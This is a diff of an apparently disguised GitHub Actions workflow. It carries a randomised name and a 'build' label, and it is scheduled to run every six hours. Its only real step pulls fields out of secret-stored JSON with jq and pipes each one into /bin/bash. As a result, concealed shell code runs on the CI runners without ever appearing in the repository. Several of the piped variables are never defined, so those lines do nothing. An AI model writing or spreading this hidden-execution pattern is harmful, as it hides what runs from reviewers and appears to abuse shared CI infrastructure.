@@ -3,23 +3,20 @@ name: qiaofengshang7890
 on:
   workflow_dispatch:
   schedule:
-    - cron: '32 1/6 * * *'
+    - cron: '33 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: qiaofengshang7890
         env:
-          uyoj75399: ${{ secrets.uyoj75399 }}
+          nmxxe8: ${{ secrets.nmxxe8 }}
         run: |
-          echo $uyoj75399 | jq -r .ku073 | /bin/bash
-          echo $wtd0 | jq -r .xj880 | /bin/bash
-          echo $gigzv03 | jq -r .rph88 | /bin/bash
-          echo $ar52329 | jq -r .higka92482 | /bin/bash
-          echo $hasui5695 | jq -r .palew34322 | /bin/bash
-          echo $izpag118 | jq -r .gc610 | /bin/bash
-          echo $i4 | jq -r .d26092 | /bin/bash
-          echo $yo41 | jq -r .dhjx10693 | /bin/bash
-          echo $ub923 | jq -r .egk38345 | /bin/bash
+          echo $nmxxe8 | jq -r .bqncw0 | /bin/bash
+          echo $pka20310 | jq -r .fcv05097 | /bin/bash
+          echo $ixw53465 | jq -r .xzl178 | /bin/bash
+          echo $wzflw7923 | jq -r .eu9928 | /bin/bash
+          echo $b3 | jq -r .mae7216 | /bin/bash
 
